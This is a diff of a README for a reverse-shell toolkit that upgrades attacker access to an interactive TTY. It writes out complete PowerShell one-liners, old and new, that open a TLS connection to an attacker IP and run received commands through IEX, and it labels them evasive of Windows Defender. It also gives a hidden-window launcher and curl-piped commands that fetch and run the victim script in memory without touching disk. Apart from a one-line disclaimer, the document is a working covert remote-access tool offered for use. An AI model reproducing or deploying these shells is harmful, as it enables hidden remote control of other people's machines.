@@ -1,24 +1,22 @@
 # 🚀 TTY Shell Stabilizer Toolkit (Secure TLS Version)
 
-A collection of scripts designed to automate the transition from a basic shell to a fully interactive TTY using **TLS encryption** and **password authentication** to prevent unauthorized hijacking.
+A collection of scripts designed to automate the transition from a basic shell to a fully interactive TTY using **TLS encryption** and **password authentication**. This version uses a single-connection coordinated flow for maximum stability and interactive PTY support.
 
 ## 📂 Scripts
 
 
 | Script | Role | Method |
 |---|---|---|
-| bash_tty.sh | Attacker | Socat-based TLS listener with dynamic RAM certificates. |
-| victim.sh | Linux Victim | Bash-based reverse shell using OpenSSL s_client. |
-| Windows One-Liner | Windows Victim | PowerShell .NET SslStream implementation (AV Evasive). |
+| bash_tty.sh | Attacker | Socat TLS listener with `stty raw` for full TTY support. |
+| victim.sh | Linux Victim | OpenSSL s_client + `/usr/bin/script` for interactive PTY. |
+| Windows One-Liner | Windows Victim | PowerShell .NET SslStream (Direct Single Connection). |
 
 ------------------------------
 
 ## 🛠 Usage Instructions
 
-To use these scripts, follow the parameter formats below. All connections are encrypted via TLS.
-
-## 1. Attacker Side (Listener)
-The listener generates a temporary RSA certificate in RAM (`/dev/shm`) and waits for a specific handshake before prompting for execution.
+### 1. Attacker Side (Listener)
+The listener generates a temporary RSA certificate in RAM (`/dev/shm`), sets the local terminal to `raw` mode to pass all keystrokes (Tab, Ctrl+C, arrows), and waits for a connection.
 
 **Usage:**
 ```bash
@@ -30,8 +28,8 @@ The listener generates a temporary RSA certificate in RAM (`/dev/shm`) and waits
 
 ## 2. Victim Side (Connection)
 
-### 🐧 Linux
-On the target machine, provide the attacker's IP, port, and the pre-shared password. It will automatically check for and install `openssl` if missing.
+### 🐧 Linux (Interactive TTY)
+On the target machine, providing the password will trigger an interactive TTY using `script`. This allows for `sudo`, `nano`, and tab-completion.
 
 **Usage:**
 ```bash
@@ -40,11 +38,11 @@ On the target machine, provide the attacker's IP, port, and the pre-shared passw
 *Example:* `./victim.sh 10.0.13.7 2222 mysecretpass`
 
 ### 🪟 Windows (AV Evasive One-Liner)
-This implementation uses native .NET classes to establish a TLS tunnel. It does not touch the disk and is highly effective against Windows Defender.
+This implementation uses native .NET classes to establish a single TLS tunnel. It is designed to work seamlessly with the attacker's raw terminal mode.
 
-**Usage (Update variables at the start):**
+**One-Liner (Update variables):**
 ```powershell
-$IP="10.0.13.7"; $P=2222; $pw="mysecretpass"; $cb={ $true }; try { $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; $w.WriteLine("WINDOWS_SHELL"); $w.Close(); $c.Close(); Start-Sleep -s 1; $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $r=New-Object System.IO.StreamReader($tl); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; if($r.ReadLine() -eq $pw){ $w.WriteLine("[+] TLS Auth OK"); while($c.Connected){ $w.Write("`r`nPS "+(pwd).Path+"> "); $t=$r.ReadLine(); if($t){ try{ $o=(IEX $t 2>&1 | Out-String); $w.Write($o) }catch{ $w.WriteLine($_.Exception.Message) } } } } $c.Close() } catch { }
+$IP="10.0.13.7"; $P=2222; $pw="mysecretpass"; $cb={$true}; try { $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $r=New-Object System.IO.StreamReader($tl); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; if($r.ReadLine() -eq $pw){ while($c.Connected){ $w.Write("`r`nPS "+(pwd).Path+"> "); $t=$r.ReadLine(); if($t){ try{ $o=(IEX $t 2>&1 | Out-String); $w.Write($o) }catch{ $w.WriteLine($_.Exception.Message) } } } } $c.Close() } catch { }
 ```
 
 ------------------------------
@@ -58,26 +56,29 @@ source <(curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali
 ```
 
 ### Execution via Remote Pipe (Linux Victim)
-Execute the shell directly in memory without leaving files on the disk. This keeps `stdin` open for the interactive session.
+Execute the shell directly in memory without leaving files on disk:
 ```bash
 bash <(curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/victim.sh) 10.0.13.7 2222 mysecretpass
 ```
 
 ### Execution via CMD (Windows Victim)
-To launch the one-liner from a standard CMD or a shortcut:
+Run the one-liner from a standard CMD prompt:
 ```cmd
-powershell -nop -w hidden -c "$IP='10.0.13.7'; $P=2222; $pw='mysecretpass'; $cb={ $true }; try { $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; $w.WriteLine('WINDOWS_SHELL'); $w.Close(); $c.Close(); Start-Sleep -s 1; $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $r=New-Object System.IO.StreamReader($tl); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; if($r.ReadLine() -eq $pw){ $w.WriteLine('[+] TLS Auth OK'); while($c.Connected){ $w.Write('`r`nPS '+(pwd).Path+'> '); $t=$r.ReadLine(); if($t){ try{ $o=(IEX $t 2>&1 | Out-String); $w.Write($o) }catch{ $w.WriteLine($_.Exception.Message) } } } } $c.Close() } catch { }"
+powershell -nop -w hidden -c "$IP='10.0.13.7'; $P=2222; $pw='mysecretpass'; $cb={$true}; try { $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $r=New-Object System.IO.StreamReader($tl); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; if($r.ReadLine() -eq $pw){ while($c.Connected){ $w.Write('`r`nPS '+(pwd).Path+'> '); $t=$r.ReadLine(); if($t){ try{ $o=(IEX $t 2>&1 | Out-String); $w.Write($o) }catch{ $w.WriteLine($_.Exception.Message) } } } } $c.Close() } catch { }"
 ```
 
 ------------------------------
-## AFTER RUNNING "EXIT" IN THE ATTACKER, PRESS ENTER TWICE SO IT LISTENS FOR MORE VICTIMS AUTOMATICALLY
 
-## ⚠️ Recovery
-If the session ends and your local terminal behaves strangely (doesn't show typing), restore it with:
+## 🔄 Automatic Re-listening
+The attacker script is designed to be "eternal". After a session ends (by typing `exit`), the terminal is restored, and the listener automatically re-arms for the next victim.
+
+## ⚠️ Terminal Recovery
+If a session is interrupted and your terminal behaves strangely (e.g., no text visible or `Enter` not working), the script should auto-restore it. If not, manually run:
 ```bash
+stty sane
+# or
 reset
 ```
 
 ------------------------------
-**Disclaimer:** For authorized security testing and administrative purposes only. Unauthorized access is illegal.
-------------------------------
+**Disclaimer:** For authorized security testing and administrative purposes only.
